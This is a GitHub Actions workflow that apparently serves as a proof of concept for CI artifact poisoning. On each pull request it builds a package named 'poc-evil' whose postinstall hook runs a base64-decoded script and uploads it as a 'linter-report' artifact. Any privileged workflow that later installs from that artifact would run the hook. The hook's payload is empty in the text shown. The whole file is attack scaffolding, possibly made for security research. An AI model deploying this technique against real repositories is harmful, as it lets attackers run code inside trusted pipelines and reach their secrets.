---
name: Lint
on:
  pull_request:
    branches: [main]

jobs:
  lint:
    runs-on: ubuntu-latest
    steps:
      - name: Stage attacker-controlled linter artifact
        env:
          PRN: ${{ github.event.pull_request.number }}
          HOOK: 
        run: |
          echo "$PRN" > pr-number.txt
          printf 'attacker supplied linter report' > linter-report.txt
          printf '{"name":"poc-root","version":"1.0.0","private":true,"dependencies":{"poc-evil":"file:./poc-evil"}}' > package.json
          mkdir -p poc-evil
          printf '{"name":"poc-evil","version":"1.0.0","scripts":{"postinstall":"node hook.js"}}' > poc-evil/package.json
          printf '%s' "$HOOK" | base64 -d > poc-evil/hook.js
      - name: Upload linter report
        if: always()
        uses: actions/upload-artifact@v7
        with:
          name: linter-report
          include-hidden-files: true
          path: |
            pr-number.txt
            linter-report.txt
            package.json
            poc-evil
          if-no-files-found: ignore